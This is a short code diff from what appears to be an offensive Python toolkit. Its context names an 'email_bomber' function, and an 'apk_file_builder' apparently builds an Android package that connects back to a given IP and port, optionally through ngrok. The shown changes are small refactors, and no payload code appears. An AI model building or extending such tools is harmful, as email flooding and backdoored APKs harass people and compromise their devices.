@@ -142,7 +142,7 @@ def email_bomber(server_choice, user, pwd, to, subject, body, count):
 def search_google(query):
     try:
         print(std_output("info") + f"Searching Google for: {query}")
-        return search(query, num_results=5)
+        return search(query, num_results=20)
     except Exception as e:
         print(std_output("error") + f"Search error: {str(e)}")
         return []
@@ -155,9 +155,8 @@ def fetch_page_html(url):
         print(std_output("error") + f"Fetch error: {str(e)}")
         return None
 
-def apk_file_builder():
-    use_ngrok = input("Use ngrok tunnel? (y/n): ").strip().lower() == "y"
-    apk_name = input("Enter APK file name: ").strip()
+def apk_file_builder(file_name, use_ngrok):
+    apk_name = file_name
     icon_input = input("Add visible icon? (y/n): ").strip().lower()
     icon = True if icon_input == "y" else None
 
@@ -185,6 +184,7 @@ def apk_file_builder():
             return
         if build:
             build(ip, port, apk_name, False, None, icon)
+
 
 
 def show_help():
@@ -237,4 +237,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
